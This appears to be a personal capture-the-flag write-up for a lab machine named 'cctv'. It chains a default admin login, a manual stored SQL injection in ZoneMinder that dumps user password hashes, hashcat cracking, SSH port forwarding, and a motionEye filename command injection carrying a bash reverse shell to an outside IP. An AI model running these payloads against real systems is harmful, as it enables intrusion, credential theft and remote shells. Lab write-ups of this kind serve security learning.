# cctv

open ports:

- 22: ssh
- 80: http

---

exploring the web app:

some shit on the main page, i went straight for the login and tried admin:admin and it worked so lol

---

we land on a zoneminder dashboard, a software for cctv. we are on version 1.37.63

searching for known vulnerabilities for this version we find there is a sql injection in the web/ajax/status.php

> Event field values (specifically Name and Cause) are stored safely via parameterized queries but are later retrieved and concatenated directly into SQL WHERE clauses without escaping. An authenticated user with Events edit and view permissions can exploit this to execute arbitrary SQL queries.

there is a poc here which explains more of the process, it is what you would expect

https://github.com/kocaemre/CVE-2026-27470

---

decided i just wanted to try doing it manually for practice-

code in the poc is using a regular session with the csrf token, in the zm docs we can find that we can just request auth from the REST api and use it for the webapp api via cookies:

`curl -XPOST -c cookies.txt -d "user=admin&pass=admin&stateful=1" "http://cctv.htb/zm/api/host/login.json"`

then we need to get any event ID that we can manipulate:

`curl -b cookies.txt "http://cctv.htb/zm/index.php?request=status&entity=events&sort_field=Id&sort_asc=1&limit=1"`

we don't have any events available to us so we need to generate one

- add a monitor with some garbage settings from the web ui
- use the rest api to make a an event for said monitor (this was the annoying part)

`curl -b cookies.txt -XPOST 'http://cctv.htb/zm/api/events.json' -d 'MonitorId=2&Cause=idk&StateId=1&StartDateTime=2026-01-01+10:10:10&EndDateTime=2026-01-01+10:11:11&Frames=0&Width=100&Height=100'`

confirm we have an event:

![pic](/images/20260321_05h32m18s_grim.png)

now we need to rename our event with the stored sqli:

`curl -vv -XPOST -b cookies.txt "http://cctv.htb/zm/index.php" -d "request=event&action=rename&id=1&eventName='+UNION+SELECT+Username,NULL+FROM+Users+LIMIT+0,1--+-"`

now that our payload is stored we perform the vulnerable read via "nearevents":

`curl -vv -b cookies.txt "http://cctv.htb/zm/index.php?request=status&entity=nearevents&id=1&sort_field=Name&sort_asc=1"`

![sqli read](/images/20260321_05h35m09s_grim.png)

as you can see, we got the first user back "admin" in the nearby events name field!!

now we can select the password for any user we want

- we can see there are 3 users from the web ui
    - admin
    - mark
    - superadmin

lets retrieve the password hashes for mark and superadmin:

`curl -vv -XPOST -b cookies.txt "http://cctv.htb/zm/index.php" -d "request=event&action=rename&id=1&eventName='+UNION+SELECT+Password,NULL+FROM+Users+LIMIT+1,1--+-"`

(read)

`curl -vv -XPOST -b cookies.txt "http://cctv.htb/zm/index.php" -d "request=event&action=rename&id=1&eventName='+UNION+SELECT+Password,NULL+FROM+Users+LIMIT+2,1--+-"`

(read)

then crack them with hashcat:

`hashcat -a 0 -m 3200 hashes.txt ~/.local/share/SecLists/Passwords/Leaked-Databases/rockyou-75.txt`

and we get a hit for mark's hash, now we can log in as mark via ssh

initial enumeration reveals lots of services bound to loopback, lets see what they are

`ss -tlpn`

![ss](/images/20260321_06h51m32s_grim.png)

we can find that the port 8765 is motionEye, a cctv management web dashboard, let's use ssh port forwarding to access it

`ssh -L 8765:localhost:8765 mark@10.129.12.194`

we need the password, which is stored in the app's config file `/etc/motioneye/motion.conf`

our motioneye version is 0.43.1b4, which is [vulnerable to a command injection attack](https://github.com/advisories/GHSA-j945-qm58-4gjx)

all we need to do is change the image filename, which undergoes shell expansion, to pop a shell

however, there is some client side validation in main.js we need to remove (it denies special chars):

`configUiValid = function () {return true}`

then we paste the payload into the image name and change the settings to automatically capture screenshots:

![cmd injection](/images/20260321_07h14m59s_grim.png)

`$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.75/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S`

![root](/images/20260321_07h15m52s_grim.png)

and then also get the user flag from /home/sa_mark (was there another way to get this before root?)

